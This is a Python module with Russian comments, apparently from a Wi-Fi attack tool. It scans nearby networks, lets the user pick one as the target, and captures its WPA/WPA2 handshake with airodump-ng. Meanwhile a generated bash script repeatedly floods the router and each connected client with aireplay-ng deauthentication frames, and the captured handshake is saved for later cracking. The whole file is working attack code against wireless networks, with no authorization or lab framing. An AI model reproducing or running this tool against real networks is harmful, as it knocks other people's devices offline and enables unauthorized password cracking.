"""Захват WPA/WPA2 handshake через airodump-ng + aireplay-ng.

Включает деаутентификацию в отдельном окне и watchdog, оживляющий адаптер,
если драйвер завис. Интерфейс должен быть в режиме monitor.
"""

import os
import time
import signal
import shutil
import tempfile
import threading
import subprocess
from pathlib import Path

from .terminal import find_terminal, launch_in_terminal, kill_group
from .iface import set_channel
from .netscan import scan_networks, display_networks, ask_scan_duration
from .constants import WATCHDOG


# ============ Проверка handshake ============

def check_handshake(cap_file):
    if not os.path.exists(cap_file) or os.path.getsize(cap_file) == 0:
        return False
    try:
        r = subprocess.run(
            ["aircrack-ng", cap_file],
            capture_output=True, text=True, timeout=30
        )
        out = r.stdout + r.stderr
        import re
        if re.search(r"\b1 handshake\b", out, re.IGNORECASE):
            return True
        if "WPA handshake" in out:
            return True
    except Exception:
        pass
    return False


# ============ bash-скрипты для окон ============

def _build_capture_script(work_dir, interface, target):
    """Готовит bash-скрипт для окна airodump-ng при захвате handshake."""
    bssid = target['bssid']
    channel = target['channel']
    prefix = str(Path(work_dir) / f"capture_{bssid.replace(':', '')}")
    cap_file = f"{prefix}-01.cap"

    cmd = (
        f'airodump-ng --bssid {bssid} --channel {channel} '
        f'--write "{prefix}" --output-format pcap,csv '
        f'{interface}'
    )

    script_path = Path(work_dir) / "capture.sh"
    script_path.write_text(
        "#!/bin/bash\n"
        f"echo '=== Захват handshake: {target['essid'] or '<скрытая>'} ({bssid}), канал {channel} ==='\n"
        "echo 'Ctrl+C — остановить захват.'\n"
        "echo\n"
        f"{cmd}\n"
    )
    script_path.chmod(0o755)
    return script_path, cap_file


def _build_deauth_script(work_dir, interface, target):
    """
    bash-скрипт для окна деаутентификации.
    Фаза 1: broadcast на роутер. Фаза 2: targeted deauth по каждому клиенту.
    """
    bssid = target['bssid']
    prefix = str(Path(work_dir) / f"capture_{bssid.replace(':', '')}")
    csv_file = f"{prefix}-01.csv"

    script_path = Path(work_dir) / "deauth.sh"
    script_path.write_text(
        "#!/bin/bash\n"
        f'IFACE="{interface}"\n'
        f'BSSID="{bssid}"\n'
        f'CSV="{csv_file}"\n'
        "\n"
        "echo '=== Деаутентификация ==='\n"
        "echo \"Цель (роутер): $BSSID\"\n"
        "echo \"Интерфейс:     $IFACE\"\n"
        "echo \"CSV станций:   $CSV\"\n"
        "echo 'Ctrl+C — остановить.'\n"
        "echo\n"
        "\n"
        "ROUND=0\n"
        "while true; do\n"
        "    ROUND=$((ROUND+1))\n"
        "    echo\n"
        "    echo \"========== Раунд $ROUND ==========\"\n"
        "\n"
        "    # --- Фаза 1: broadcast на роутер ---\n"
        "    echo \"[$(date +%H:%M:%S)] Фаза 1: broadcast deauth на роутер\"\n"
        "    aireplay-ng --deauth 15 -a \"$BSSID\" \"$IFACE\" 2>&1 | tail -5\n"
        "    echo \"[$(date +%H:%M:%S)] Ждём 8 сек, чтобы клиенты переподключились...\"\n"
        "    sleep 8\n"
        "\n"
        "    if [ ! -f \"$CSV\" ]; then\n"
        "        echo \"[$(date +%H:%M:%S)] CSV ещё не создан, повторяю broadcast.\"\n"
        "        continue\n"
        "    fi\n"
        "\n"
        "    STATIONS=$(awk -F',' -v bssid=\"$BSSID\" '\n"
        "        /^Station MAC/ { in_st = 1; next }\n"
        "        in_st {\n"
        "            gsub(/^ +| +$/, \"\", $1)\n"
        "            gsub(/^ +| +$/, \"\", $6)\n"
        "            if (toupper($6) == toupper(bssid) && $1 != \"\") print $1\n"
        "        }\n"
        "    ' \"$CSV\" | sort -u)\n"
        "\n"
        "    if [ -z \"$STATIONS\" ]; then\n"
        "        echo \"[$(date +%H:%M:%S)] Клиентов пока нет. Повторяю broadcast.\"\n"
        "        continue\n"
        "    fi\n"
        "\n"
        "    N=$(echo \"$STATIONS\" | wc -l)\n"
        "    echo \"[$(date +%H:%M:%S)] Обнаружено клиентов: $N\"\n"
        "\n"
        "    # --- Фаза 2: targeted deauth по каждому клиенту ---\n"
        "    for STATION in $STATIONS; do\n"
        "        echo \"[$(date +%H:%M:%S)] Фаза 2: targeted deauth -> $STATION\"\n"
        "        aireplay-ng --deauth 20 -a \"$BSSID\" -c \"$STATION\" \"$IFACE\" 2>&1 | tail -3\n"
        "        sleep 3\n"
        "    done\n"
        "\n"
        "    echo \"[$(date +%H:%M:%S)] Все клиенты обработаны. Новый раунд через 20 сек...\"\n"
        "    sleep 20\n"
        "done\n"
    )
    script_path.chmod(0o755)
    return script_path


# ============ Watchdog ============

def _any_file_fresh(paths, threshold=15):
    """True, если хотя бы один из файлов обновлялся не позднее threshold сек назад."""
    for p in paths:
        if os.path.exists(p) and (time.time() - os.path.getmtime(p)) <= threshold:
            return True
    return False


def _revive_watchdog(interface, watch_files, stop_event,
                     check_interval=WATCHDOG["check_interval"],
                     stale_threshold=WATCHDOG["stale_threshold"],
                     cooldown=WATCHDOG["cooldown"],
                     revive_seconds=WATCHDOG["revive_seconds"],
                     startup_grace=WATCHDOG["startup_grace"]):
    """
    Следит за mtime .cap/.csv. Если ни один файл не обновлялся stale_threshold
    секунд — гоняет airodump-ng без канала revive_seconds секунд, чтобы драйвер
    переинициализировался. startup_grace — окно в начале, пока airodump ещё
    поднимается и файлы законно отсутствуют.
    """
    start = time.time()
    # cooldown должен действовать и на первой итерации (иначе оживление
    # запускалось бы сразу, ещё до создания файлов захвата).
    last_revive = start
    seen_file = False

    while not stop_event.is_set():
        time.sleep(check_interval)
        if stop_event.is_set():
            break

        if time.time() - start < startup_grace:
            continue

        if any(os.path.exists(p) for p in watch_files):
            seen_file = True
        elif not seen_file:
            continue

        if _any_file_fresh(watch_files, stale_threshold):
            continue

        if time.time() - last_revive < cooldown:
            continue

        print(f"\n[!] Ни .cap, ни .csv не обновляются >{stale_threshold} сек — "
              f"оживляю без фиксации канала ({revive_seconds} сек).")

        revive = subprocess.Popen(
            ["airodump-ng", interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid
        )
        try:
            for _ in range(revive_seconds):
                time.sleep(1)
                if stop_event.is_set():
                    break
        finally:
            try:
                os.killpg(os.getpgid(revive.pid), signal.SIGINT)
                try:
                    revive.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    os.killpg(os.getpgid(revive.pid), signal.SIGKILL)
            except (ProcessLookupError, PermissionError):
                pass

        last_revive = time.time()
        print("[+] Оживление завершено.")


# ============ Захват ============

def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):
    bssid = target['bssid']
    channel = target['channel']
    essid = target['essid'] or '<скрытая>'

    if not channel.isdigit():
        print(f"[-] Некорректный канал: {channel!r}")
        return None

    # Фиксируем канал адаптера, чтобы оба окна работали на одном канале
    set_channel(interface, channel)

    work_dir = Path(work_dir)
    cap_script, cap_file = _build_capture_script(work_dir, interface, target)

    term_name, term_cmd = find_terminal()
    if term_name is None:
        print("[!] Терминал не найден. Захват в этом окне, без графики.")
        prefix = str(work_dir / f"capture_{bssid.replace(':', '')}")
        airodump = subprocess.Popen(
            ["airodump-ng", "--bssid", bssid, "--channel", channel,
             "--write", prefix, "--output-format", "pcap", interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        cap_term = None
    else:
        cap_term = launch_in_terminal(term_name, term_cmd, cap_script)
        airodump = cap_term

    # Общий флаг остановки для фоновых потоков (watchdog + fallback-деаут).
    stop_watchdog = threading.Event()

    deauth_term = None
    if deauth:
        deauth_script = _build_deauth_script(work_dir, interface, target)
        if term_name is not None:
            deauth_term = launch_in_terminal(term_name, term_cmd, deauth_script)
        else:
            # Завязан на stop_watchdog, иначе поток деаутил бы вечно и после захвата.
            def _deauth_loop():
                while not stop_watchdog.is_set():
                    subprocess.run(
                        ["aireplay-ng", "--deauth", "10", "-a", bssid, interface],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    for _ in range(20):
                        if stop_watchdog.is_set():
                            break
                        time.sleep(1)
            threading.Thread(target=_deauth_loop, daemon=True).start()

    print(f"\n[*] Цель:    {essid} ({bssid}), канал {channel}")
    print(f"[*] Файл:    {cap_file}")
    print(f"[*] Таймаут: {timeout} сек (Ctrl+C — остановить)")

    csv_file = cap_file.replace("-01.cap", "-01.csv")
    watch_files = [cap_file, csv_file]

    watchdog = threading.Thread(
        target=_revive_watchdog,
        args=(interface, watch_files, stop_watchdog),
        daemon=True
    )
    watchdog.start()

    start = time.time()
    found = False
    try:
        while time.time() - start < timeout:
            if cap_term is not None and cap_term.poll() is not None:
                print("\n[*] Окно захвата закрыто.")
                break
            if deauth_term is not None and deauth_term.poll() is not None:
                print("\n[*] Окно деаутентификации закрыто.")
                break

            if os.path.exists(cap_file) and check_handshake(cap_file):
                found = True
                print("\n[+] Handshake найден!")
                break

            remaining = int(timeout - (time.time() - start))
            print(f"\r[*] Ожидание... {remaining:3d} сек", end='', flush=True)
            time.sleep(3)
    except KeyboardInterrupt:
        print("\n[*] Прервано.")
    finally:
        stop_watchdog.set()
        kill_group(deauth_term)
        kill_group(cap_term)
        if cap_term is None and airodump is not None and airodump.poll() is None:
            try:
                airodump.send_signal(signal.SIGINT)
                airodump.wait(timeout=5)
            except Exception:
                airodump.kill()
        time.sleep(1)

    print()
    if os.path.exists(cap_file):
        if found or check_handshake(cap_file):
            print(f"[+] Handshake сохранён: {cap_file}")
        else:
            print(f"[-] Handshake не найден. Файл: {cap_file}")
        return cap_file
    print("[-] Файл захвата не создан.")
    return None


# ============ Сценарий ============

def ask_save_path(cap_file):
    """Спрашивает, куда сохранить пойманный handshake. Path или None."""
    default = Path.cwd() / Path(cap_file).name
    print(f"\n[+] Handshake пойман.")
    print(f"    По умолчанию: {default}")
    print("    Enter — сохранить по умолчанию, 'c' — отменить сохранение.")

    user = input("Путь: ").strip()
    if user.lower() == 'c':
        return None

    if user == "":
        target = default
    else:
        target = Path(user).expanduser()
        if target.is_dir():
            target = target / Path(cap_file).name

    if not target.parent.exists():
        try:
            target.parent.mkdir(parents=True, exist_ok=True)
        except OSError as e:
            print(f"[-] Не удалось создать директорию: {e}")
            return None

    if target.exists():
        ans = input(f"'{target}' уже существует. Перезаписать? (y/n): ").strip().lower()
        if ans != 'y':
            print("[*] Сохранение отменено.")
            return None

    return target


def choose_action():
    """Меню действий с сетью: 'deauth' | 'passive' | None."""
    print("\nДействия с выбранной сетью:")
    print("  1. Деаутентификация")
    print("  2. Пассивное наблюдение")
    print()
    print("  0. Назад")
    while True:
        c = input("Действие: ").strip()
        if c == '0':
            return None
        if c == '1':
            return 'deauth'
        if c == '2':
            return 'passive'
        print("Неизвестный пункт. Введите 1, 2 или 0.")


def handshake_flow(interface):
    """Полный сценарий: скан -> выбор сети -> захват (деаут/пассив) -> сохранение."""
    tmp_dir = Path(tempfile.mkdtemp(prefix="wifitool_"))
    try:
        duration = ask_scan_duration()

        networks = scan_networks(interface, duration, tmp_dir)
        if not networks:
            print("[-] Сети не найдены.")
            return

        display_networks(networks)

        target = None
        while True:
            try:
                choice = input(
                    f"\nВыберите номер сети (1-{len(networks)}, 0 — отмена): "
                ).strip()
            except (KeyboardInterrupt, EOFError):
                print("\n[*] Отменено.")
                return

            if choice == "":
                print("Пустой ввод. Введите число или 0 для отмены.")
                continue
            if choice == "0":
                print("[*] Отменено.")
                return
            try:
                idx = int(choice) - 1
            except ValueError:
                print(f"Ошибка: нужно целое число от 0 до {len(networks)}.")
                continue
            if 0 <= idx < len(networks):
                target = networks[idx]
                break
            print(f"Ошибка: число должно быть от 1 до {len(networks)}.")

        while True:
            print(f"\n[*] Цель: {target['essid'] or '<скрытая>'} ({target['bssid']})")
            action = choose_action()
            if action is None:
                print("[*] Возврат в меню.")
                return

            deauth = (action == 'deauth')

            try:
                timeout_str = input("\nТаймаут захвата в секундах (Enter = 180): ").strip()
                timeout = int(timeout_str) if timeout_str else 180
                if timeout <= 0:
                    timeout = 180
            except ValueError:
                timeout = 180

            cap_file = capture_handshake(
                interface, target, tmp_dir, timeout=timeout, deauth=deauth
            )

            if cap_file and os.path.exists(cap_file) and check_handshake(cap_file):
                save_path = ask_save_path(cap_file)
                if save_path:
                    try:
                        shutil.move(cap_file, save_path)
                        print(f"\n[+] Handshake сохранён: {save_path}")
                    except Exception as e:
                        print(f"[-] Не удалось сохранить: {e}")
                else:
                    print("[*] Файл не сохранён.")
            else:
                print("\n[-] Handshake не пойман.")
    finally:
        try:
            shutil.rmtree(tmp_dir, ignore_errors=True)
        except Exception:
            pass
